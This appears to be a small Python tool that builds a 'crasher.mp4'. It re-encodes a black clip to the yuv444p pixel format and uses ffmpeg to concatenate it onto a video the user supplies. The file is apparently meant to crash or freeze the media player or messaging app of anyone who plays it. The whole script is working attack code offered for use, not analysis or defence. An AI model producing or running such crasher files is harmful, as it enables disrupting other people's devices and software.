import os,sys
import subprocess
import glob
import os
import sys
from colorama import Fore, Back, Style

def clear():
    os.system("clear;cls")
    
def blank():
    print(" ")

def blocks():
    print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
    
def main():
    blank()
    blocks()
    firstf = input(f"""    {Fore.BLUE }${Fore.RESET} Video => """)
    blocks()
    os.system(f"""ffmpeg -i black.mp4 -pix_fmt yuv444p new-vid.mp4""")
    blank()
    blocks()
    open("code.txt", "w").close()
    file = open("code.txt","w") 
    file.write(f"""file {firstf}\n""")
    file.write(f"""file new-vid.mp4""")
    file.close()
    blank()
    blocks()
    os.system("ffmpeg -f concat -i code.txt -codec copy crasher.mp4")
    os.system("rm -rf code.txt")
    os.system("rm -rf new-vid.mp4")
    os.system("clear")
    clear()
main()
